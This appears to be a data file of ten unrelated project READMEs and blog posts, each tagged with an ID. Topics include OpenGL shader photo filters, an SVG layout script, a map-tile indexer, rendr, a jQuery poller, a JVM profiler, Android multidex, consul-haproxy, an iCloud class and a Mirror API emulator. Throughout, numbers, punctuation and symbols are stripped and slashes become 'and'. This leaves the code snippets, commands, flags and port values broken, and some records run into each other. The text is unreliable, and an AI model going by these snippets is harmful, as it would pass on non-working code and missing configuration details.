17715612, i used to spend quite some time working with photoshop  to edit photos or do some digital painting however i became too lazy to ps since i started to use smartphones apps like instagram seems to be able to do the processing job more efficiently and produce results that look surprisingly amazing not considering the quality loss of the photo after studying the opengl shaders i thought i should be enable to do mimic the filter effect using shaders with those previous experience working with photoshop i could first explore in photoshop to figure out the steps to take to produce the filter effect then i could implement it using opengl es shaders after spending some time in research i kind of found the way to duplicate the filter effect might not be exactly the same but the feeling is captured take the hudson filter as an example i summarized the work i have done learned from a digital photography course in the college the first thing we need to do when loading an photo into the photoshop is to adjust the level and curve however i think level and curve adjusting is not that easy to implement in the shaders how about a less effective but simpler way adjust brightness and contrast and saturation all these three steps can be easily realized by blending the image with a base image either a constant image or the luminanced image of itself by simply doing these the quality of the image can be improved quite a lot then if the filter favors a particular color can adjust the color balance a bit or can also add a filter layer on top then blend it with the base image hudson is a filter to make the image have an icy look the slight tint and altered lighting give the images a colder feel therefore a radial gradient mask with blue to black is used for blending with a lot trials i found that overlay blending mode is best suitable to produce the vignetting effect darkens the corners overlay blending is a combination of multiply and screen it darkens the darker part and brightens the lighter part of the base image and we can adjust the opacity of the top filtering layer to make the effect less strong basically that s it just simply three steps  adjust b and c and s  adjust color balance  overlay blend a radial gradient layer with some opacity let s see the result emm not exactly but similar so i have three things to do adjust the b and c and s change the color balance and add a new layer of texture to overlay blend on top  adjust the b and c and s in my previous post i have discussed all the three processes i just combine them into a single function in the fragment shader vec brightnesscontrastsaturation vec color float brt float con float sat vec black vec      vec middle vec       float luminance dot color w vec gray vec luminance luminance luminance vec brtcolor mix black color brt vec concolor mix middle brtcolor con vec satcolor mix gray concolor sat return satcolor  adjust color i slightly adjust the single channel and and add blue vec blueresult vec bcsresult r bcsresult g bcsresult b    overlay blending the function of overlay blending vec ovelayblender vec color vec filter vec filterresult float luminance dot filter w if luminance   filterresult  filter color filterresult    filter    color return filterresult the result from shader implementation similarly i create more filters to mimic the instagram style i add noise at the edge of the top filter lay to produce the over exposured film effect in hefe filter give high saturation to vibrate the color and to emphasize the dark corners to get x pro reduce the saturation and add a lot of red and yellow to give the feel of rise filter add a red to purple filter to get the toaster effect this is so fun weeks ago i was told by my friend of the words connecting the dots i start to realize what it means find the things you are good at and try to make connection and produce better work on it i will definitely continue with this work i am also glad to share with anyone who are interested in this area find the full implementation of the basic image processing using opengl es shaders in android from my github

18781347, svg is deemed to be the holy grail for graphics in resposive web design but are they really yes and no beeing scalable let them appear perfectly sharp in any resolution and the fact that they are based on vector definitions make them small when it comes to file size but in situations where you want layout inside a svg it is quite frustrating of course there is this viewbox thing that can help sometimes but most of the time drives you crazy some of the node attributes can be set with percentages but others only in user units e g polygons paths it is a bit like having a position absolute style on every dom node and then try to make the layout flow vlex is the attempt to overcome this svg shortcomings it is a damn small script  kb with a lot of comments  bytes minified and gzipped that allows once added to the svg a declarative layout the basic idea is to introduce an attribute vlex  that holds a description with all the micro logic inside to layout a node properly on a resize event have a look at the quickstart example where a circle is centered on stage with small effort and than go on to the other vlexamples the most simple way to use vlex and svg and div none of these examples is usefull per se if you are interested to vlex something usefull you should read the upcoming api or just the comented source code almost equal size if you are interested in some backgrounds have a look down at the end of this page the main function of vlex call it to init vlex and parameter and type and description and and and and element and dom node id string or null and pass a dom node or its id string to start vlex pass null to stop vlex and and options and object and pass a options object to change vlexs behaviour and and option and type and default and description and and and and and onresize and boolean and true and auto update on resize event and and onmousemove and boolean and false and auto update on mousemove event and and and object and undefined and properties of are available in vlexpressions via dollar sign and the return value of vlexs main function is a update function call it to trigger an update manually and parameter and type and description and and and and and object and this overwrites the old new and old do not merge make sure you deliver the default props x y cx cy if you need them in you vlexpressions and and force and boolean and vlexpressions are getting cached you have to pass true  if you want to have them reevaluated e g after changing a expresssion or after adding an new node with a vlexpression and svg nodes with a vlex attribute are getting handeld on a vlex update the value of the vlex attribute is called vlexpression and consists of one or more property descriptions seperated by a semicolon   key and value of a property description have to be seperated by a colon   the key of a property description maps its evaluated value to the native svg attribute with the same name the value of a property description can consist of one or more strings and and or eval statements inside curly braces   eval statements get evaluated on update all eval statements and strings of a property description get concatenated to a single string that is passed to the native svg attribute finaly the dollar sign   gives access to predefined values userdefined values and functions can be assigned to before or during an update the property accessor point  prop gets added on the compilation of a vlexpression all properties and functions of javascripts math are available just by calling their name e g min  max  pi  and param and default and description and and and and x y and element clientwidth element clientheight and normaly the with and height of the outermost svg and and cx cy and x and  y and  and

you may ask what usecase i had in mind for vlex for me it is to build cross device uis especially for webmapping apps vlex should make a single svg ui overlay work on fullhd screens tablets and smartphones a task for example is to shrink buttons and to reduce space between them but keep them at a minimum of px and avoid overlaps

10353962, this is a tool for indexing large lists of geographic points or lines and dynamically generating map tiles from the index for display dependencies  modern c compiler like gcc or clang libpng ideally a  bit machine with  gb free memory installation  first install make and libpng then type after the build finishes you will have  new command line programs available in the local directory encode render enumerate merge the basic idea is that if you have a file of points like this                         or segments like this                                                 you can index them by doing cat file and and encode o directoryname z  to encode them into a sorted quadtree in web mercator in a new directory named code directoryname and code  with enough bits to address individual pixels at zoom level  you can then do and render d directoryname    to dump back out the points that are part of that tile or and render directoryname    foo png to make a png format map tile of the data you need more data if you want your tile to have more than just one pixel on it though alternately if you want an image for a particular area of the earth instead of just one tile you can do and render a directoryname zoom minlat minlon maxlat maxlon foo png the is because otherwise code getopt and code will complain about negative numbers in the latitudes or longitudes for example you could use and render a dots dm          sf png to generate an image of the san francisco bay area at zoom level  from the encoded data in dots dm the point indexing is inspired by brandon martin anderson s hierarchy of files for vectors that fit in different zoom levels and i don t know if anybody else does it that way rendering assumes it can code mmap and code an entire copy of the file into the process address space which isn t going to work for large files on  bit machines performance especially at low zoom levels will be much better if the file actually fits in memory instead of having to be swapped in merging files  code encode and code will only write to a brand new file if you want to add data to an existing file the way to do it is to create a new file with code encode and code and then use code merge and code to combine the old and the new cat newdata and encode o new dm merge o combined dm old dm new dm code merge and code also has an option code u and code  to eliminate duplicates between the source files while merging them generating a tileset  the code enumerate and code and code render and code programs work together to generate a tileset for whatever area there is data for if you do for example enumerate z dirname and xargs l p and render o tiles and dirname code enumerate and code will output a list of all the zoom and x and y combinations that appear in code dirname and code through zoom  and code xargs and code will invoke code render and code on each of these to generate the tiles into code tiles and dirname and code you can enumerate a single zoom by specifying both z and z for maximum and minimum so if you want just z code enumerate z z and code the code p and code makes xargs invoke  instances of code render and code at a time if you have a different number of cpu cores a different number may work out better if you want to filter the output of render for example through pngquant to reduce the number of colors you can do it by having xargs invoke a subshell enumerate z dirname and xargs l p sh c mkdir p tiles and dirname and  and  render     and pngquant  tiles and dirname and  and  and  png dummy the code dummy and code argument is important because code sh c and code eats the first argument after the command adding color to data  the syntax for color is kind of silly but it works so i had better document it colors are denoted by distance around the color wheel the brightness and saturation are part of the density rendering the color only controls the hue if you want to have  possible hues that takes  bits to encode so you need to say encode m to give space in each record for  bits of metadata each input record in addition to the location also then needs to specify what color it should be and the format for that looks like                to make the first one red the second one green and the third one blue and then when rendering you do render c to say that it should use the metadata as ths of the color wheel options to render  input file zoom level and bounds  the basic form is render dir zoom x y to render the specified tile into a png file on the standard output dt a i dir zoom minlat minlon maxlat maxlon and i and dt dd instead of rendering a single tile zoom and x and y  the invocation format changes to render the specified bounding box as a single image and dd dt f i dir and i and dt dd also read input from i dir and i in addition to the file in the main arguments you can use this several times to specify several input files and dd output file format  dt d and dt dd output plain text same format as encode uses giving the coordinates and metadata for each point or line within the tile and dd dt d and dt dd output geojson giving the coordinates and metadata for each point or line within the tile and dd dt t i pixels and i and dt dd image tiles are i pixels and i pixels on a side the default is   is useful for high res retina displays and dd dt r and i and dt dd leaflet style retina where a request for a tile at zoom level n is actually a request for a quarter of a tile at zoom level n  in this case the quarter tiles remain x and dd dt o i dir and i and dt background  dt t i opacity and i dd changes the background opacity the default is  fully opaque and dd dt w and dt dd the default background color becomes white not black and dd dt b i hex and i and dt dd specifies i hex and i to be the background color the default is black or white if w is set and dd dt m and dt dd makes the output image a mask the data areas are transparent and the background is opaque the default is the opposite and dd dt c i hex and i and dt dd specifies i hex and i to be the fully saturated color at the middle of the output range the default is gray and dd dt s i hex and i and dt dd specifies i hex and i to be the oversaturated color at the end of the output range the default is white and dd dt s and dt dd use only the color range leading up to full saturation the default treats saturated color as the middle of the range and allows the output to be oversaturated all the way to white or the s color and dd brightness and thickness  dt b i base brightness ramp and i and dt dd sets the basic display parameters li i base and i is the zoom level where each point is a single pixel the default is  and li li i brightness and i is the value contributed by each dot at that zoom level the default is   with the default square root gamma this means it takes  dots on the same pixel to reach full color saturation and  to reach full oversaturation it should have been   so that it would hit it exactly and li li i ramp and i is the an additional brightness boost given to each dot as zoom levels get higher or taken away as zoom levels get lower slightly increasing the effect of halving the number of dots with each zoom level the default is   and li and ul and dd dt e i exponent and i and dt dd allows specifying a different rate at which dots are dropped at lower zoom levels the default is  and anything much higher than that will look terrible at low zoom levels and anything much lower will be very slow at low zoom levels   seems to work pretty well for giving a quality boost to the low zoom levels the i ramp and i from b is automatically adjusted to compensate for the change and dd dt g i gamma and i and dt dd sets the gamma curve which causes each additional dot plotted on the same pixel to have diminishing returns on the total brightness the default is   for square root and dd dt l i thickness and i and dt dd sets the base thickness of lines the default is  for a single pixel thickness and dd dt l i ramp and i and dt dd sets the thickness ramp for lines the line gets thicker by a factor of i ramp and i for each zoom level beyond the base level from b the default is  for constant thickness thicker lines are drawn dimmer so that the overall brightness remains the same and dd dt p i area and i and dt dd specifies a multiplier for dot sizes point brightness is automatically reduced by the same factor so the total brightness remains constant just diffused the default is  example p for area  and dd dt p g i area and i and dt dd specifies a gaussian brush instead of a flat disk as well as a multiplier for dot sizes example pg for gaussian with area  and dd dt c i hues and i and dt dd interpret the metadata as one of i hues and i hues around the color wheel numbering starts at  for red and continues through orange yellow green blue violet and back to red and dd dt c i meta hue meta hue and i and dt dd specify a range of hues that correspond to a domain of meta values the hues are numbered in degrees  for red  for orange  for yellow  for green  for cyan  for blue  for violet you can specify hues below  or above  to wrap around across red and dd dt x c i radius and i f and x c i radius and i m and dt dd interpret the metadata as a number of points to be plotted in the specified i radius and i in feet or meters around the point in the data and dd dt x b and dt dd make the brightness of each feature proportional to the metadata value and dd dt x r and dt dd make the radius of each point proportional to the metadata value and dd dt x s i max and i and dt dd cap the saturation of meta colors at i max and i instead of   they will go all the way to white if you use  and dd dt x u and dt dd use an approximation of cielch uniform color space so that all hues with the same density will have approximately equal lightness and saturation blues will be brighter and greens will be dimmer and dd compensation  dt g and dt dd reduce the brightness of lines whose endpoints are far apart to compensate for gps samples that jump around or bogus connections to to  and dd dt o i base dist ramp and i and dt dd tune the parameters for reasonable distances between points li i base and i is the zoom level at which only fully acceptable samples are given full brightness the default is  and li li i dist and i is the allowable distance between samples at the i base and i zoom level the unit is z tiles or about cm and i need to make that something more human oriented the default is  and li li i ramp and i is the factor of additional distance that is allowed at each lower zoom level the default is   and li and ul and dd dt m i latitude and i and dt dd mercator compensation makes the dots bigger at latitudes higher than the one specified and smaller at latitudes closer to the equator and dd vector styling  dt v and dt dd instead of the normal output produce a cartocss file for tilemill  to approximate the brightness dot ramp gamma and colors you specified use render vector to make the vector tiles themselves and dd dt a and dt dd turn off anti aliasing and dd

9059522, easier to keep up to date  the purpose of this little app is to demonstrate one way of using rendr to build a web app that runs on both the client and the server npm install g grunt cli npm uninstall g grunt clone this repo to a local directory and run npm install to install dependencies git clone git github com airbnb and rendr app template git cd rendr app template npm install then use grunt server to start up the web server grunt will recompile and restart the server when files change grunt server running bgshell runnode bgshell task running handlebars compile handlebars task file app and templates and compiledtemplates js created running rendrstitch compile rendrstitch task file public and mergedassets js created running stylus compile stylus task file public and styles css created server pid  listening on port  in development mode running watch task waiting now pull up the app in your web browser it defaults to port  you can choose a different port by passing the port environment variable port  grunt server if this happens to you you can supply your github creds for http basic auth using the basicauth environment variable be very very careful with this it means you will be typing your github credentials in plain text which will be saved to your bash history and may be intercepted by other programs if you do this immediately change your password before and afterwards this should only be necessary if you re developing on the app and need to keep refreshing the page basicauth githubusername githubpassword grunt server you ve been warned your best bet may be to alter the project to read from your favorite restful api this basic rendr app looks like a hybrid between a standard client side mvc backbone js app and an express app with a little rails convention thrown in check out the directory structure and app and and collections and and controllers and and models and and templates and and views and and app js and router js and routes js and assets and and config and and public and and server and note i want to stress that this is just one way to build an app using rendr i hope it can evolve to support a number of different app configurations with the shared premise that the components should be able to run on either side of the wire for example the full on client side mvc model isn t appropriate for all types of apps sometimes it s more appropriate to load html fragments over the wire also known as pjax rendr apps should be able to support this as well var user require app and models and user using stitch we can use the same require function in the browser this allows us to focus on application logic not packaging modules separately for client and server in node js you can also use require to load submodules within npm models for example we could load rendr s base view in order to extend it to create a view for our app var baseview require rendr and shared and base and view because of a trick in the way we do stitch packaging this module path works in the browser as well and and app and routes js module exports function match match  home index match repos  repos index match repos and owner and name  repos show match users  users index match users and login  users show a controller is a simple javascript object where each property is a controller action keep in mind that controllers are executed on both the client and the server thus they are an abstraction whose sole responsibility is to specify which data is needed to render the view and which view to render on the server controllers are executed in response to a request to the express server and are used to render the initial page of html on the client controllers are executed in response to pushstate events as the user navigates the app here is a very simple controller and and app and controllers and homecontroller js module exports index function params callback callback null homeindexview every action gets called with two arguments params and callback the params object contains both route params and query string params callback is called to kick off view rendering it has this signature function err viewname viewdata following the node js convention the first argument to the callback is err we ll pass null here because we re not fetching any data but if we were that s how we d communicate a fetching error this is a string identifier of a view used by the router to find the view class i e require app and views and and viewname an object to pass to the view constructor this is how we pass data to the view all our index action above really does is specify a view class this is the simple case no data fetching just synchronous view rendering it gets more interesting when we decide to fetch some data check out the reposcontroller below and and app and controllers and reposcontroller js module exports show function params callback var spec model model repo  params params this app fetch spec function err result callback err reposshowview  result you see here that we call this app fetch to fetch our repo model our controller actions are executed in the context of the router so we have a few properties and methods available one of which is this app this is the instance of our application s app context which is a sublcass of rendr and base and app  which itself is a subclass of backbone model you ll see that we inject app into every model view collection and controller this is how we maintain app context throughout our app you see here that we call callback with the err that comes from this app fetch  the view class name and the result of the fetch result in this case is an object with a single model property which is our instance of the repo model this app fetch does a few nice things for us it fetches models or collections in parallel handles errors does caching and most importantly provides a way to boostrap the data fetched on the server in a way that is accessible by the client side on first render a rendr view is a subclass of backbone view with some additional methods added to support client server rendering plus methods that make it easier to manage the view lifecycle creating your own view should look familiar if you ve used backbone and and app and views and homeindexview js var baseview require and baseview module exports baseview extend classname homeindexview  events click p handleclick  handleclick function  module exports id homeindexview you can add classname  tagname  events  and all of the other backbone view properties you know and love we set the property id on the view constructor to aid in the view hydration process more on that later our views just like all of the code in the app and directory are executed in both the client and the server but of course certain behaviors are only relevant in the client the events hash is ignored by the server as well as any dom related event handlers notice there s no render method or template property specified in the view the philosophy here is that sensible defaults and convention over configuration should allow you to skip all the typical boilerplate when creating views the render method should be the same for all your views all it does is mash up the template with some data to generate html and insert that html into the dom element now because we re not using a dom to render our views we must make sure that the view returns all its html as a string on the server view gethtml is called which returns the view s outer html including wrapper element this is then handed to express which wraps the page with a layout and sends the full html page to the client behind the scenes view gethtml calls view getinnerhtml for the inner html of the view not including wrapping element and then constructs the wrapping element based on the tagname  classname  etc properties and the key value pairs of html attributes returned by view getattributes  which allows you to pass custom attributes to the outer element on the client view render is called which updates the view s dom element with the html returned from view getinnerhtml by default backbone will create the wrapper dom element on its own we make sure to also set any custom html attributes in view getattributes on the element a common need is to run some initialization code that touches the dom after render for things like jquery sliders special event handling etc rather than overriding the render method use postrender the postrender method is executed for every view once after rending including after initial pageload and and app and views and homeindexview js var baseview require and baseview module exports baseview extend classname homeindexview  postrender function this slider slider module exports id homeindexview if you have a need to customize the way your views generate html there are a few specific methods you can override by default gettemplatename returns the underscored version of the view constructor s id property so in our case homeindexview it will also look for options templatename  which is useful for initialing views to use a certain template the view will look in app and templates for the value returned by this function if gettemplatename isn t enough you can override gettemplate to return a function that takes a single data argument and returns html function data return html this html is used to populate the view s inner html that is not including the wrapper element which you can specify on the view itself using tagname  classname  and id if you re building some sort of composite view that doesn t utilize a simple template override getinnerhtml this is useful for tabbed views collection views etc you probably shouldn t ever need to override this by default it just combines the html returned by getinnerhtml and the html attributes returned by getattributes to produce an outer html string view userreposview collection repos app router currentview child render function cid view  model child options object el p fn p init   from there we can find our child userreposview view app router currentview childviews child app router currentview childviews  child render function cid view  options object el p fn p init   el div userreposview check out its collection property which is the instance of repos which we fetched in the controller and passed down in the view helper app router currentview childviews  collection child options object app child params object meta object length  you can nest subviews ad infinitum our userreposview has an empty childviews array now but we could add some subviews if we found it useful for organizing our codebase or keeping things dry app router currentview childviews  childviews views also have a parentview property which will be non null unless they are a top level view app router currentview childviews  parentview app router currentview app router currentview parentview we can achieve this by lazy loading models or collections in our subviews check out the users showlazy action which demonstrates this approach and and app and controllers and userscontroller js module exports showlazy function params callback var spec model model user  params params this app fetch spec function err result if err return callback err and and extend the hash of options we pass to the view s constructor and and to include the templatename option which will be used and and to look up the template file this is a convenience so we and and don t have to create a separate view class  extend result templatename users and showlazy  callback err users and show  result the first thing to notice is that in our fetch spec  we only specify the user model leaving out the repos collection then we tell the view to use a different template than the default we do this by passing in a templatename property to the view s options which is passed to its constructor we extend the result object to have this the third argument to our callback is an object that s passed to the view s constructor we could have also created a separate view class in javascript for this to match our new template here s the users and showlazy template abbreviated view userreposview collectionname repos paramname login paramvalue login lazy true so the only difference to our original users and show template is that instead of passing collection repos to our userreposview subview we pass collectionname repos paramname login paramvalue login lazy true when fetching collections we specify params which are used to fetch and cache the models for that collection we quote all of these arguments except for paramvalue login quoted arguments are passed in as string literals and unquoted arguments are references to variables that are available in the current handlebars scope login is one of the attributes of a user model which gets passed into the template the lazy true tells the view that it needs to fetch or find a cached version of the specified model or collection now if we click from the list of users on users index  you ll see the page gets rendered immediately and the repos are rendered once the api call finishes if you click back and forward in your browser you see it s cached so far rendr just supports handlebars templates but it should be possible to make this interchangeable for now place your templates in app and templates with a name that matches the underscorized view s identifier and file extension of hbs so the view with an identifier of homeindexview will look for a template at app and templates and homeindexview hbs

236076, a port of prototype s ajax periodicalupdater function to jquery basically this function polls some remote service at fairly regular internvals and optionally processes the result via a callback the period of calls will decay as long as the same response keeps coming back from the server either in the form of repeated data or in the form of a  not modified status  which reduces the load on the server naturally the first ajax call happens as a page onready handler ie the jquery function call  so it is safe to put the periodicalupdater call anywhere on the page javascript periodicalupdater and path and to and service  url url and and url of ajax request cache false and and by default don t allow caching method get  and and method get or post data  and and array of values to be passed to the page e g name john  greeting hello mintimeout  and and starting value for the timeout in milliseconds maxtimeout  and and maximum length of time between requests multiplier  and and if set to  timerinterval will double each time the response hasn t changed up to maxtimeout maxcalls  and and maximum number of calls  no limit maxcallscallback null and and the callback to execute when we reach our max number of calls autostop  and and automatically stop requests after this many returns of the same data  disabled autostopcallback null and and the callback to execute when we autostop cookie false and and whether and how to store a cookie runatonce false and and whether to fire initially or wait verbose  and and the level to be logging at  none  some  all  function remotedata success xhr handle and and process the new data only called when there was a change and and for a description of success  see ajax documentation and and you can also do a bound version identical to above except that the callback function and and has this assigned to the jquery object that you call it on myclass periodicalupdater and path and to and service  and and  function and and and and this is myclass the data value can be one of three things a scalar in which case it will be used constantly a javascript map and object in which case it will be turned into key and value pairs by jquery an anonymous function in which case it will be executed before each ajax call see a scalar in which case it is treated as the cookie name a javascript map and object in which case you can specify the cookie name as the name property and you can additionally specify any configuration value for the jquery cookie plugin in order to configure the cookie a boolean which signals to use a cookie if true  and not to use a cookie if false if you don t specify a cookie name the cookie name defaults to the periodicalupdater s url warning if you use two periodicalupdaters with the same cookie name they will each overwrite the other s value resulting in wonky timeout behavior can be passed to the setting map including the ajax callbacks the only exception is the flag that treats modifications as errors that is always going to be true the function call returns a handle you can call stop on this handle in order to stop the updating and ignore any subsequent responses if the maximum number of calls stop  or the autostop has been triggered you can restart the updater using restart on the handle you can also call send on the handle to force a send of the ajax request this handle is also passed into the callback functions as the fourth argument for more info about the motivation for this plugin including its advantages over the deprecated innovate version see see the source file for license terms

20271491, riemann jvm profiler is a jvm agent that you can inject into any jvm process one written in clojure java scala groovy etc which sends function level profiler telemetry to a riemann server for analysis visualization and storage it is designed to answer questions like across this thousand node hadoop job what functions consume the most cpu time and doc and screenshot png riemann jvm profiler requires no changes to your codebase you ll need a riemann server with the websocket and http server ws server accessible from each jvm process the default riemann websocket port is  you can add riemann jvm profiler artifact to your maven or leiningen project application startup code invoke the profiler programmatically ns my app bin gen class name my app bin require riemann jvm profiler as profiler defn main args start riemann profiler profiler and start global host my riemann server prefix my app load   to profile any jvm process build a fat jar using leiningen cd riemann jvm profiler lein uberjar that ll spit out a file called target and riemann jvm profiler    jar  which you should copy to somewhere on the classpath or filesystem on each node where you d like to profile a jvm process then add the agent to that process java startup options java javaagent and var and lib and riemann jvm profiler jar prefix my apphost my riemann server assuming you ve distributed the jar to each node hadoop jar myjob jar foo bar dmapred map child java opts javaagent and var and lib and riemann jvm profiler jar host my riemann serverlocalhost pid true dmapred reduce child java opts javaagent and var and lib and riemann jvm profiler jar host my riemann serverlocalhost pid true we re passing localhost pid true to tell the profiler that its host field should include the process id since hadoop spins up more than one jvm per box you could theoretically use dcache to distribute the jar to each hadoop node and have it symlinked into some relative path prior to jvm start but documentation is conflicting and scarce at best and i ve never gotten that to work with cascading and cascalog scping the profiler uberjar to each node seems most reliable the profiler samples the stacks of all running threads as often as possible while consuming only load fraction of a single core expect  to  samples per second depending on hardware and thread count it builds up a statistical estimate of how much time is spent in each function normalized to seconds and second every dt seconds the profiler finds the functions which consumed the most running thread time finds an exemplar stacktrace for that function which contributed the most to its runtime and sends each function as a single event to riemann choosing the dimensionless unit seconds and second allows the profiler to produce meaningful results when combined across machines with similar cores and systemic loads but possibly disparate numbers of cores the profiler is not yet smart enough to normalize load to compensate for the other processes on a given box haven t figured out a reliable way to guess the cpu use of the jvm yet functions on boxes with higher background load will be proportionately over represented if application workload is uncorrelated with background load this should not be a huge problem combining profiler events across hosts yields a picture of the distributed system s hotspots as a whole you can interpret the individual and summed metrics as being an approximate least upper bound on the number of cores engaged in running that function here s a small profiler aggregation stream require clojure string as str defn profiler index where not expired event splitp re matches service aggregate rate of samples taken profiler rate coalesce total sample rate smap folds and sum

pipe by service coalesce  smap folds and sum with host nil ttl  and index the top  top  metric index with state expired index i usually have a top level splitp to route events to various subsystems let index index streams splitp re find service route profiler events to the profiler my app profiler profiler index index anything else index fire up a grid in riemann dash sorted by metric  and choose a query to view your particular application here i m looking at the whitewash prefix and excluding the epollwait function since it s not actually doing real service whitewash profiler fn and not service epollwait it may be helpful to have graphs or cells to show the number of hosts reporting and the aggregate sample rate service whitewash profiler hosts service whitewash profiler rate

minsdkversion  targetsdkversion   and and enabling multidex support multidexenabled true note that the dependency on com android support multidex    is automatic there is not need to specify it deprecated non official multidex  library project including compatibility multi dex loader this can be used by an android project to install classloader with multiple dex of applications running on api  and repo i ll maintain this for a while since i needed this to be in a maven repo for easy consumption while dexing classes it is sometimes possible to exceed the maximum  methods limit try using google play services and scaloid for instance trouble writing output too many method references  max is  you may try using multi dex option so the suggestion is to use the multi dex option of the dx utility this will generate several dex files classes dex  classes dex  etc that will be included in the apk to do so add the following code to your app s build gradle file afterevaluate tasks matching it name startswith dex each dx if dx additionalparameters null dx additionalparameters  dx additionalparameters and multi dex and and enable multidex and and optional and and dx additionalparameters and main dex list projectdir and filename tostring and and enable the main dex list by default dalvik s classloader will look for the classes dex file only so it s necessary to patch it so that it can read from multiple dex files that s what this project provides if you are unlucky enough the multidex classes will not be included in the classes dex file the first one read by the classloader  which in turn will render all this useless there s a workaround for this though create a file with this content and a arbitrary name android and support and multidex and buildconfig class android and support and multidex and multidex v class android and support and multidex and multidex v class android and support and multidex and multidex v class android and support and multidex and multidex

and support and multidex and ziputil centraldirectory class android and support and multidex and ziputil class and pass the path of this file to the main dex list option of the dx utility just uncomment the example from above accordingly by enabling one more item to the list of strings exposed by the additionalparameters property the filename is the arbitrary choosed above add this project to your classpath groovy repositories jcenter dependencies compile com google android multidex   then you have  possibilities declare android support multidex multidexapplication as the application in

21442406, this project provides consul haproxy  a daemon for dynamically configuring haproxy using data from consul the daemon watches any number of backends for updates and when appropriate renders an configuration template for haproxy and then invokes a reload command which can gracefully reload haproxy this allows for a zero downtime reload of haproxy which is populated by and bin and consul haproxy h the consul haproxy command takes a number of cli flags addr provides the http address of a consul agent by default this assumes a local agent at      backend backend specification can be provided multiple times the specification of a backend is documented below dry dry run emit config file to stdout f path to config file overwrites cli flags the format of the file is documented below in path to a template file this is the template that is rendered to generate the configuration file at out it uses the golang templating can be provided multiple times if specified multiple times specify the same number of paths with out out path to output configuration file this path must be writable by consul haproxy or the file cannot be updated this can be specified multiple times reload command to invoke to reload configuration this command can be any executable and should be used to reload haproxy this is invoked only after the configuration file is updated quiet quiet specifies a duration of time to wait for no updates before writing out the new configuration this allows for waiting until a service stabilizes to prevent many different reloads max wait max wait is used to limit how waiting is done for a quiet period before forcing a reload this defaults to x the quiet value as an example if quiet s but the backends are constantly flapping a refresh will be forced after  minutes in addition to using cli flags consul haproxy can be configured using a file given the f flag a configuration file overrides any values given by the cli unless otherwise specified the configuration file should be a json object with the following keys address same as addr cli flag backends a list of backend specifications this is merged with any backends provided via the cli dryrun same as dry cli flag paths same as out cli flag this value should be a list of paths and is merged with any paths provided via the cli reloadcommand same as reload cli flag templates same as in cli flag this value should be a list of templates and is merged with any paths provided via the cli quiet same as quiet cli flag maxwait same as max wait cli flag one of the key configuration values to consul haproxy is the backends that it should monitor these are the service entries that are watched for changes and used to populate the configuration file the syntax for a backend is backendname tag service datacenter port the specification provides a variable name for the template backendname  which is defined as the entries that match the given tag and service for a specific datacenter a port can also be provided which overrides the port specified by the service the tag datacenter and port are all optional and can be omitted below are a few examples app release webapp this defines a template variable app which watches for the webapp service filtering on the release tag db mysql east aws  this defines a template variable db which watches for the mysql service in the east aws datacenter using port  a useful features is the ability to specify multiple backends with the same variable name this causes the nodes to be merged this can be used to merge nodes with various tags or different datacenters together as an example we can define app webapp dc app webapp dc app webapp dc this backend specification sets app variable to be the union of the servers in the dc  dc  and dc datacenters the template language is the golang text and template package which is basic usage is quite simple as an example suppose we define a simple backends with app webapp east aws  cache redis we might provide a very basic template like global daemon maxconn  defaults mode tcp timeout connect ms timeout client ms timeout server ms listen http in bind  range app maxconn  end listen cache in bind  range cache maxconn  end this will populate the http in block with the servers in the app backend and the cache in with the servers in the cache backend this template will be re rendered when any of those servers changing allowing for dynamic updates we run the example below against our quickly test consul haproxy first lets create a simple template global daemon maxconn  defaults mode tcp timeout connect ms timeout client ms timeout server ms listen http in bind  range c end now we can run the following to get our output configuration consul haproxy addr demo consul io in in conf backend c consul nyc  backend c consul sfo  dry when this runs we should see something like the following global daemon maxconn  defaults mode tcp timeout connect ms timeout client ms timeout server ms listen http in bind  server nyc consul consul      server nyc consul consul      server nyc consul consul      server sfo consul consul      server sfo consul consul      server sfo consul consul      import directors load the directors range c backend node  id host ip port port end sub vclinit new bar directors roundrobin range c bar addbackend node  id end sub vclrecv send all traffic to the bar director set req backendhint bar backend now we run the following command consul haproxy addr demo consul io in in conf backend c consul nyc  backend c consul sfo  dry the following should return

16022822, icloud access last updated  th january  icloud access is a simple class that makes it easier to work with icloud hiding details such as file coordination and metadata queries it is much more like accessing a web service with a cocoa networking class which most developers are more used to just drag the icacloud h and icacloud m files directly into your mac or ios xcode project the methods of the class are fairly self explanatory mirroring nsfilemanager to some extent one big difference is that most are asynchronous with a completion callback block the completion block includes an error parameter which should be checked if it is nil  the operation was successful and if an nserror is supplied it failed cloud paths are relative to the ubiquity container but you can optionally supply a relative path to a root directory in the container this directory and intermediate directories will be created automatically if they don t exist you should check the isconnected property to make sure the user is logged into icloud before using the class here is a simple example of using the icacloud class icacloud cloud icacloud alloc initwithubiquitycontaineridentifier xxxxxxxxxx com mycompany cloudtest rootdirectorypath path and to and data and root if cloud isconnected cloud createdirectoryatpath subdirectory completion nserror error if error nslog failed to create subdirectory return   cloud uploadlocalfile and users and me and downloads and localimage png topath subdirectory and cloudimage png completion nserror error if error nslog failed to upload  error

9170177, this is an attempt to recreate the behaviour of the mirror api to allow developers like me who can t be part of the glass explorer program to test potential applications that could be feasible using glass and even if the real mirror api turns out to be completely different from what i envision it to be you can use this as a learning place for different google technologies google cloud endpoints with javascript and python clients google and sign in client side flow glass emulator google and sign in server side flow web app google app engine for web applications in general channel api for push notifications to the browser based emulator and how they all can work together for a detailed description of what this does and how it works this package is meant to be hosted on google app engine and includes several parts mirrorapi is an implementation of the mirror api using google cloud endpoints emulator contains a browser based emulator for glass can be accessed at yourapp appspot com and glass and service and service py is a simple playground implementation for a web application that makes use of the mirror api service and auth py handles all authentication and storing of credentials when a user signs up for the demo services sets up contacts and subscriptions when the user first connects also handles disconnection by removing all contacts and subscriptions and deleting credentials when the user wants to disconnect service and notify py handles subscription post requests coming from the mirror api and forwards the requests to the relevant demo services demos and py are demo services that react to incoming notifications  clone or fork and clone this repository cd mirror api  fetch the endpointsprotodatastore repository git submodule init git submodule update the name of the application will be referred to as yourapp for the following steps  activate the google and api in services  and the places api for one of the demo services  create a new client id for web applications in api access  click on create an oauth   client id  fill out a product name and click next  keep web application and select more options next to your site or hostname  make authorized redirect uris empty  click on create client id  create a new simple api access server key  click on create new server key  keep the ip field empty if you want to accept all ip adresses or fill in the ip subnets that you got from your isp  click on create  edit mirrorapiserver and clientsecrets json and change yourclientid  yourclientsecret and yourapikey to the information from the if you have additional client ids you want to access the mirror api with add them in additionalclientids important don t commit that file if you contribute to this project one possible  edit mirrorapiserver and app yaml to change the name of the application to yourapp to install the necessary dependencies and deploy the application specifically you will need the steps to register contacts and subscriptions you will first have 